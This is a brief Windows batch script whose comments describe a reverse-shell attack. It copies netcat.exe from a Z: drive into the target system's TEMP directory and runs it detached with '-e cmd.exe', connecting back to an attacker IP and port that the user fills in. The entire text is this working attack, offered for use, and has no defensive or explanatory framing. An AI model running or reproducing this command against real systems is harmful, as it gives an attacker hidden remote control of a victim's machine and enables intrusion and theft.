:: Add attacker IP to IP, to be connected port to PORT line below!
Z: & mkdir %TEMP%\netcat & copy netcat.exe %TEMP%\netcat & netcat.exe IP PORT -e cmd.exe -d & exit

:: Goes Z: drive.
:: Creates netcat directory in target system's TEMP directory.
:: Copies netcat.exe inside Z: drive to %TEMP%\netcat directory.
:: Makes reverse connection from target system to attacker system IP and port.